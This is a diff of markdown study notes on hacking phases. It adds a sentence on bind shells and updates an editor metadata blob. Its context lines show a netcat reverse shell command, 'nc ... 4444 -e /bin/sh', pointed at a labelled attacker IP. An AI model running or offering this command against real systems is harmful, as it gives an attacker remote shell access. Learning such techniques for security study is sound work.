@@ -131,6 +131,9 @@ nc 192.168.156.1 4444 -e /bin/sh
 ```
 > 192.168.156.1 is attacker's IP address
 > e for execute command
+
+In bind shell, the target sets up a listener on a specific port and the attacker connects to the target. But the execution of `/bin/sh` remains in the target's machine.
+```
 ## Gaining Access
 ## Maintaining Access
 ## Covering Tracks
@@ -138,11 +141,11 @@ nc 192.168.156.1 4444 -e /bin/sh
 Read:
 Darknet diaries
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTAzODQ1NDY4NiwxODE4MTc2MjE5LC0xMD
-k3ODkxODEzLDIwNTQxNzA4NTQsMTUzNDY5MjI1NCwtMzYzMTYy
-MDA5LDQ5Mjg5MTM1NCwtMTQ5ODIzMTAxLDE4NjU2MjI4MTAsLT
-IwODE0NjMyMTQsLTEwMTgzNjI2NywtNDc0OTkwOTg4LC0xNDcz
-MTE1MzYsLTEyNDQxOTcyOTgsNzYyNzgyMTYyLC0xODMxMzM5OD
-ksNDYyMDI2Njc1LC0xMTc2OTU3NjkzLC0xMDA3NTEyMjA4LC01
-MzM3MjY4NTFdfQ==
+eyJoaXN0b3J5IjpbNDQ1MDI3NDM3LDE4MTgxNzYyMTksLTEwOT
+c4OTE4MTMsMjA1NDE3MDg1NCwxNTM0NjkyMjU0LC0zNjMxNjIw
+MDksNDkyODkxMzU0LC0xNDk4MjMxMDEsMTg2NTYyMjgxMCwtMj
+A4MTQ2MzIxNCwtMTAxODM2MjY3LC00NzQ5OTA5ODgsLTE0NzMx
+MTUzNiwtMTI0NDE5NzI5OCw3NjI3ODIxNjIsLTE4MzEzMzk4OS
+w0NjIwMjY2NzUsLTExNzY5NTc2OTMsLTEwMDc1MTIyMDgsLTUz
+MzcyNjg1MV19
 -->
